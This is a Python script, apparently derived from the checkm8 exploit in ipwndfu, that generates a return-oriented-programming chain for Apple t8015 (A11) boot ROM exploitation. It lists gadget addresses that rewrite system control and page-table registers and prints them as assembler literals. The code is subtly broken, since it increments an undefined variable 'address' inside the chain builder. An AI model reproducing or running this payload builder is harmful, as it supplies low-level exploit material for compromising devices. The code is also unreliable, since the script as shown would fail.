#!/usr/bin/env python3
#
# https://raw.githubusercontent.com/axi0mX/ipwndfu/master/checkm8.py

from typing import Tuple

t8015_load_write_gadget = 0x10000945C
t8015_write_sctlr_gadget = 0x1000003EC
t8015_func_gadget = 0x10000A9AC
t8015_write_ttbr0 = 0x10000045C
t8015_tlbi = 0x1000004AC
t8015_dc_civac = 0x1000004D0
t8015_dmb = 0x1000004F0
t8015_callbacks = [
    (t8015_dc_civac, 0x18001C800),
    (t8015_dc_civac, 0x18001C840),
    (t8015_dc_civac, 0x18001C880),
    (t8015_dmb, 0),
    (t8015_write_sctlr_gadget, 0x100D),
    (t8015_load_write_gadget, 0x18001C000),
    (t8015_load_write_gadget, 0x18001C010),
    (t8015_write_ttbr0, 0x180020000),
    (t8015_tlbi, 0),
    (t8015_load_write_gadget, 0x18001C020),
    (t8015_write_ttbr0, 0x18000C000),
    (t8015_tlbi, 0),
    (0x18001C800, 0),
]


def quad_literal(value, nl=True) -> str:
    return f".quad {hex(value)}" + ("\n" if nl else "")


def make_rop_chain(base, func_gadget, callbacks) -> str:
    result = ""

    for i in range(0, len(callbacks), 5):
        block1 = ""
        block2 = ""
        for j in range(5):
            base += 0x10

            if j == 4:
                address += 0x50

            if i + j < len(callbacks) - 1:
                block1 += quad_literal(func_gadget)
                block1 += quad_literal(base)
                block2 += quad_literal(callbacks[i + j][1])
                block2 += quad_literal(callbacks[i + j][0])
            elif i + j == len(callbacks) - 1:
                block1 += quad_literal(func_gadget)
                block1 += quad_literal(0)
                block2 += quad_literal(callbacks[i + j][1])
                block2 += quad_literal(callbacks[i + j][0])
            else:
                block1 += quad_literal(0)
                block1 += quad_literal(0)

        result += block1 + block2

    return result


preamble = [
    0x180020400 - 8,
    0x1000006A5,
    0x180020600 - 8,
    0x180000625,
    0x18000C600 - 8,
    0x180000625,
    0,
    0,
]

for p in preamble:
    print(quad_literal(p, nl=False))


print(make_rop_chain(0x18001C020, t8015_func_gadget, t8015_callbacks))
